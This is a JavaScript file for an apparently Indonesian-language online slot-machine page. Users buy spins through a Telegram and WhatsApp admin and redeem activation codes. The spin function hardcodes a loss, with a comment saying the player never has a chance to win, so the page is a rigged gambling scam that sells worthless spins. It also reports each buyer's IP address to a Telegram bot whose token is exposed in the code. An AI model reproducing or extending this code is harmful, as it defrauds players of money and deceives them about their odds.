// Simpan saldo spin pengguna di localStorage
let saldoSpin = localStorage.getItem("saldoSpin") ? parseInt(localStorage.getItem("saldoSpin")) : 0;

// Simpan kode aktivasi yang valid berdasarkan IP pengguna
let kodeAktif = JSON.parse(localStorage.getItem("kodeAktif")) || {};

// Simpan IP pengguna di localStorage
let userIP = localStorage.getItem("userIP") || null;

// ID Telegram Admin & Token Bot
const TELEGRAM_CHAT_ID = "7955475790";
const TELEGRAM_BOT_TOKEN = "7604621678:AAE98s3IrekFLs1FFWqGGD6-2AfzbJHmJLw";

// Nomor WhatsApp Admin
const WHATSAPP_ADMIN = "85939797240"; // Ganti dengan nomor WA admin

// 🔄 Update saldo spin di UI & simpan ke localStorage
function updateSaldo() {
    document.getElementById("saldo").innerText = saldoSpin;
    localStorage.setItem("saldoSpin", saldoSpin);
}

// 🔍 Ambil IP pengguna saat pertama kali masuk
async function getUserIP() {
    try {
        let response = await fetch("https://api64.ipify.org?format=json");
        let data = await response.json();
        userIP = data.ip;
        localStorage.setItem("userIP", userIP);
    } catch (error) {
        console.error("Gagal mendapatkan IP pengguna:", error);
    }
}

// 🛒 Tombol BELI - Kirim ke Telegram Admin & alihkan ke WhatsApp
document.getElementById("buyButton").addEventListener("click", function () {
    if (!userIP) {
        alert("Gagal mendapatkan IP, coba lagi!");
        return;
    }

    let kodeBaru = generateKode();
    kodeAktif[userIP] = kodeBaru;
    localStorage.setItem("kodeAktif", JSON.stringify(kodeAktif));

    let pesan = `📢 Ada pembelian baru!\nKode: ${kodeBaru}\nIP: ${userIP}\nHubungi pembeli untuk mengirimkan kode.`;

    // Kirim ke Telegram Admin
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(pesan)}`)
        .then(response => response.json())
        .then(() => {
            alert("Permintaan pembelian dikirim! Hubungi admin untuk kode.");
            window.location.href = `https://wa.me/${WHATSAPP_ADMIN}?text=Halo, saya ingin membeli spin!`;
        })
        .catch(error => console.error("Gagal mengirim ke Telegram:", error));
});

// 🔑 Tombol GUNAKAN KODE - Validasi kode & tambah spin
document.getElementById("verifyButton").addEventListener("click", function () {
    let kode = document.getElementById("kodeInput").value.trim().toUpperCase();

    if (!kode) {
        alert("Masukkan kode aktivasi terlebih dahulu!");
        return;
    }

    if (kodeAktif[userIP] === kode) {
        saldoSpin += 5;
        delete kodeAktif[userIP];
        localStorage.setItem("kodeAktif", JSON.stringify(kodeAktif));
        updateSaldo();
        alert("Kode berhasil digunakan! Anda mendapat 5 spin.");
        document.getElementById("kodeInput").value = "";
    } else {
        alert("Kode salah atau sudah digunakan!");
    }
});

// 🎰 Tombol SPIN - Jalankan slot hanya jika saldo cukup
document.getElementById("spinButton").addEventListener("click", function () {
    if (saldoSpin <= 0) {
        alert("Saldo spin habis! Gunakan kode aktivasi atau beli spin.");
        return;
    }

    saldoSpin--;
    updateSaldo();
    jalankanSlot();
});

// 🎲 Fungsi untuk menjalankan slot dengan animasi gulungan
function jalankanSlot() {
    let reels = [
        document.getElementById("reel1"),
        document.getElementById("reel2"),
        document.getElementById("reel3")
    ];
    let resultText = document.getElementById("result");

    let spinSound = document.getElementById("spinSound");
    let winSound = document.getElementById("winSound");
    let loseSound = document.getElementById("loseSound");

    let symbols = ["🍒", "🍋", "🍉", "🍇", "⭐", "💎"];
    let isWin = false; // Selalu kalah, tidak ada peluang menang

    let results = [];
    if (isWin) {
        let winSymbol = symbols[Math.floor(Math.random() * symbols.length)];
        results = [winSymbol, winSymbol, winSymbol];
    } else {
        let shuffledSymbols = [...symbols].sort(() => 0.5 - Math.random());
        results = [shuffledSymbols[0], shuffledSymbols[1], shuffledSymbols[2]];
    }

    spinSound.play();

    reels.forEach((reel, index) => {
        reel.innerHTML = "";
        let items = [];
        for (let i = 0; i < 10; i++) {
            let randomSymbol = symbols[Math.floor(Math.random() * symbols.length)];
            items.push(`<div>${randomSymbol}</div>`);
        }
        items.push(`<div>${results[index]}</div>`);
        reel.innerHTML = items.join("");

        let duration = 2000 + index * 500;
        reel.style.transition = `transform ${duration / 1000}s ease-out`;
        reel.style.transform = "translateY(-1000%)";

        setTimeout(() => {
            reel.style.transition = "none";
            reel.style.transform = "translateY(0%)";
            reel.innerHTML = `<div>${results[index]}</div>`;
        }, duration);
    });

    setTimeout(() => {
        spinSound.pause();
        spinSound.currentTime = 0;

        if (isWin) {
            let phoneNumber = prompt("🎉 Anda Menang! Masukkan nomor telepon Anda:");
            if (!phoneNumber) {
                alert("Anda harus memasukkan nomor telepon untuk mengklaim hadiah!");
                return;
            }

            winSound.play();
            resultText.innerHTML = `🎉 JACKPOT! Anda Menang dengan ${results[0]} 🎉`;
            resultText.style.color = "gold";

            let pesanMenang = `🎉 Pemenang Baru! 🎉\nSimbol: ${results[0]}\nNomor: ${phoneNumber}\nIP: ${userIP}\nSilakan cek siapa yang menang.`;

            // Kirim notifikasi ke Telegram Admin
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(pesanMenang)}`)
                .then(response => response.json())
                .catch(error => console.error("Gagal mengirim ke Telegram:", error));

            // Arahkan pengguna ke WhatsApp Admin untuk klaim hadiah
            setTimeout(() => {
                window.location.href = `https://wa.me/${WHATSAPP_ADMIN}?text=Halo, saya menang jackpot dengan simbol ${results[0]}. Nomor saya: ${phoneNumber}`;
            }, 2000);
        } else {
            loseSound.play();
            resultText.innerHTML = "😞 Coba Lagi!";
            resultText.style.color = "red";
        }
    }, 3000);
}

// 🔢 Fungsi untuk generate kode unik
function generateKode() {
    let chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let kode = "";
    for (let i = 0; i < 6; i++) {
        kode += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return kode;
}

// 🔄 Perbarui saldo saat pertama kali dibuka
updateSaldo();
getUserIP();
